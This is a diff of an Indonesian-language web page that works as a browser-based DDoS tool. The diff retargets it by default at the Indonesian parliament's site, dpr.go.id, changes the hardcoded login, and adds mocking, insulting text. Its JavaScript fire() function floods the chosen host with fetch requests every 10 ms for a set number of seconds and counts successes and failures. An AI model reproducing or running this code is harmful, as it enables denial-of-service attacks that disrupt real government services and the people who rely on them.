@@ -2,27 +2,28 @@
 <html lang="id">
 <head>
   <meta charset="utf-8"/>
-  <title>Anis DDoS Hub</title>
+  <title>Siap DDoS DPR</title>
   <link rel="stylesheet" href="style.css"/>
 </head>
 <body>
 
-<!-- LOGIN -->
+<!-- LOGIN SCREEN -->
 <div id="loginBox">
-  <h1 class="glitch" data-text="HIDUPP PUAN-vip">Oxylus-vip</h1>
+  <h1 class="glow">SIAP GELUT</h1>
+  <p class="sub">Masukin kred lo, terus kita hajar.</p>
   <input id="user" placeholder="User"/>
   <input id="pass" type="password" placeholder="Pass"/>
-  <button onclick="login()">ENTER</button>
+  <button onclick="login()">GAS</button>
 </div>
 
 <!-- PANEL -->
 <div id="panel" style="display:none;">
-  <h2>Selamat Datang, <span id="uname"></span> 😈</h2>
-  <p class="sambutan">"Semua aturan adalah lelucon. Mari kita hancurkan satu per satu."</p>
+  <h2>Halo <span id="uname"></span>, siap ngegas DPR? 🔥</h2>
+  <p class="sambutan">"DPR kayak gombal: penuh janji, minim hasil. Ayo kita tindih."</p>
 
-  <input id="host" placeholder="https://target.com"/>
+  <input id="host" placeholder="https://dpr.go.id"/>
   <input id="dur" type="number" placeholder="Durasi (detik)" value="60"/>
-  <button onclick="fire()">FIRE</button>
+  <button onclick="fire()">HANTAM</button>
   <pre id="log"></pre>
 </div>
 
@@ -30,12 +31,12 @@
 function login(){
   const u=document.getElementById('user').value;
   const p=document.getElementById('pass').value;
-  if(u==='oxylus' && p==='12092010'){
+  if(u==='daf' && p==='12092010'){
     document.getElementById('loginBox').style.display='none';
     document.getElementById('panel').style.display='block';
     document.getElementById('uname').textContent=u;
   }else{
-    alert('Salah, coba lagi tolol 😜');
+    alert('Kred salah, coba lagi bangsat 😈');
   }
 }
 
@@ -55,29 +56,24 @@ const proxies = [
 function randProxy(){ return proxies[Math.floor(Math.random()*proxies.length)]; }
 
 async function fire(){
-  const host=document.getElementById('host').value;
+  const host=document.getElementById('host').value || 'https://dpr.go.id';
   const dur =parseInt(document.getElementById('dur').value);
   const log =document.getElementById('log');
-  log.textContent='[+] Starting browser flood...\n';
+  log.textContent='[+] Ngacir, bro...\n';
   let ok=0, fail=0;
   const ctrl=new AbortController();
-  const tOut=setTimeout(()=>ctrl.abort(),dur*1000);
+  setTimeout(()=>ctrl.abort(),dur*1000);
 
   const loop=setInterval(async()=>{
     try{
-      const r=await fetch(host,{
-        mode:'no-cors',
-        cache:'no-store',
-        signal:ctrl.signal,
-        headers:{'User-Agent':'Oxylus-vip'}
-      });
+      await fetch(host,{mode:'no-cors',cache:'no-store',signal:ctrl.signal,headers:{'User-Agent':'SiapGelut'}});
       ok++;
     }catch(e){ fail++; }
-  },10); // 100 req/s per tab
+  },10);
 
   setTimeout(()=>{
     clearInterval(loop);
-    log.textContent+=`[+] Done → OK:${ok}  FAIL:${fail}\n`;
+    log.textContent+=`[+] Selesai → OK:${ok}  FAIL:${fail}\n`;
   },dur*1000);
 }
 </script>
